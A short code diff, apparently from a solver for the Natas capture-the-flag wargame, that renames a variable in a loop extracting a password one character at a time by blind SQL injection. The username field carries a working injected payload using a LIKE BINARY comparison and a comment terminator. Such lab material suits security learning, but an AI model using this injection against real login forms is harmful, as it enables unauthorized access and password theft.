@@ -89,7 +89,7 @@ print('\n')
 password = ""
 # note that, so far, the password has been 32 characters long
 for i in range(32):
-    for char in possible_chars:
+    for char in password_chars:
         data = {
             # we need to use binary to perform case sensitive query
             'username' : f'natas16" and password like binary "{password + char}%" #A ',
